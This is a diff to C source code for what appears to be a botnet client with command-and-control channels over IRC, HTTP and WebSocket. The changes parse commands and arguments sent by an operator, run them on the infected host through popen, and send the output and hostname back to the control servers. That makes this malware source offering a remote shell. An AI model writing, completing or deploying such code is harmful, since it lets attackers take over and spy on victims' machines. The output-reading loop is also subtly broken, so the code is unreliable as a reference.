@@ -176,15 +176,23 @@ int irc_read(notnet_bot_t *bot, char *buf, int len) {
     }
     
     /* Process PRIVMSG commands */
-    char *privmsg = strstr(buf, ":");
-    if (privmsg && strstr(privmsg, "PRIVMSG")) {
-        char *cmd_start = strchr(privmsg, ':');
-        if (cmd_start) {
-            cmd_start++; /* skip the colon */
-            /* Parse command */
-            char cmd[256];
-            snprintf(cmd, sizeof(cmd), "%s", cmd_start);
-            log_info("IRC: command: %s", cmd);
+    char *privmsg = strstr(buf, "PRIVMSG");
+    if (privmsg) {
+        /* Find the message part after the channel name */
+        char *colon = strchr(privmsg, ':');
+        if (colon) {
+            colon++; /* skip the colon, point to message text */
+            /* Trim trailing \r\n */
+            int msg_len = strlen(colon);
+            while (msg_len > 0 && (colon[msg_len - 1] == '\r' || colon[msg_len - 1] == '\n' || colon[msg_len - 1] == ' ')) {
+                colon[--msg_len] = '\0';
+            }
+            /* Copy full message text as the command (e.g. "exec uname -a") */
+            int cmd_len = msg_len;
+            if (cmd_len > len - 1) cmd_len = len - 1;
+            memcpy(buf, colon, cmd_len);
+            buf[cmd_len] = '\0';
+            log_info("IRC: command: %s", buf);
             return 1; /* signal new command */
         }
     }
@@ -526,6 +534,7 @@ int protocol_process_commands(notnet_bot_t *bot) {
     
     /* Check HTTP - read responses for queued commands */
     if (bot->c2_http.connected) {
+        memset(buf, 0, sizeof(buf));
         int result = http_read(bot, buf, sizeof(buf));
         if (result > 0) {
             log_info("HTTP: http_read returned %d bytes", result);
@@ -540,9 +549,30 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 char *end = start ? strchr(start + 1, '"') : NULL;
                 if (start && end && end > start) {
                     int clen = end - start - 1;
-                    if (clen > 0 && clen < 127) {
+                    if (clen > 0 && clen < 254) {
+                        memset(bot->cmd_queue[bot->cmd_count], 0, 256);
                         strncpy(bot->cmd_queue[bot->cmd_count], start + 1, clen);
                         bot->cmd_queue[bot->cmd_count][clen] = '\0';
+                        /* Extract "args" value and append to command */
+                        char *args_key = strstr(buf, "\"args\"");
+                        if (args_key) {
+                            /* Find colon after "args" (6 chars), then skip to opening quote of value */
+                            char *colon = strchr(args_key + 6, ':');
+                            char *args_val = NULL;
+                            if (colon) {
+                                args_val = strchr(colon + 1, '\"');
+                            }
+                            if (args_val) {
+                                char *args_end = strchr(args_val + 1, '\"');
+                                if (args_end && args_end > args_val) {
+                                    int alen = args_end - args_val - 1;
+                                    if (alen > 0 && clen + 1 + alen < 254) {
+                                        bot->cmd_queue[bot->cmd_count][clen] = ' ';
+                                        strncat(bot->cmd_queue[bot->cmd_count], args_val + 1, alen);
+                                    }
+                                }
+                            }
+                        }
                         bot->cmd_count++;
                         log_info("HTTP: command: %s", bot->cmd_queue[bot->cmd_count - 1]);
                     }
@@ -571,7 +601,21 @@ int protocol_process_commands(notnet_bot_t *bot) {
         } else if (strncmp(cmd, CMD_SCAN, strlen(CMD_SCAN)) == 0) {
             log_info("CMD: scan");
         } else if (strncmp(cmd, CMD_EXEC, strlen(CMD_EXEC)) == 0) {
-            log_info("CMD: exec: %s", cmd + strlen(CMD_EXEC));
+            char *args = cmd + strlen(CMD_EXEC);
+            log_info("CMD: exec: %s", args);
+            char output[1024] = {0};
+            FILE *fp = popen(args, "r");
+            if (fp) {
+                size_t n = 0;
+                while (fgets(output + n, sizeof(output) - n, fp)) n++;
+                pclose(fp);
+                log_info("CMD: exec output (%zu bytes)", n);
+                protocol_send_response(bot, CMD_EXEC, output);
+            } else {
+                snprintf(output, sizeof(output), "exec failed: %s", strerror(errno));
+                log_info("CMD: exec failed: %s", strerror(errno));
+                protocol_send_response(bot, CMD_EXEC, output);
+            }
         } else if (strncmp(cmd, CMD_DOWNLOAD, strlen(CMD_DOWNLOAD)) == 0) {
             log_info("CMD: download");
         } else if (strncmp(cmd, CMD_UPDATE, strlen(CMD_UPDATE)) == 0) {
@@ -659,6 +703,34 @@ char *protocol_hex_encode(const char *data, int len) {
     
     buf[pos] = '\0';
     return buf;
+}
+
+int protocol_send_response(notnet_bot_t *bot, const char *command, const char *result) {
+    char response[512];
+    snprintf(response, sizeof(response),
+        "{\"cmd\":\"%s\",\"result\":\"%s\",\"hostname\":\"%s\"}",
+        command, result, bot->hostname);
+    int len = strlen(response);
+    
+    /* Send response via IRC */
+    if (bot->c2_irc.connected && bot->c2_irc.authenticated) {
+        irc_send(bot, "PRIVMSG %s :%s", bot->c2_irc.channel, response);
+        log_info("IRC: response sent (%d bytes)", len);
+    }
+    
+    /* Send response via HTTP */
+    if (bot->c2_http.connected) {
+        http_post(bot, response, len);
+        log_info("HTTP: response sent (%d bytes)", len);
+    }
+    
+    /* Send response via WebSocket */
+    if (bot->c2_ws.connected) {
+        ws_send(bot, response, len);
+        log_info("WS: response sent (%d bytes)", len);
+    }
+    
+    return len;
 }
 
 /* ── Config Loading ──────────────────────────────────────────── */
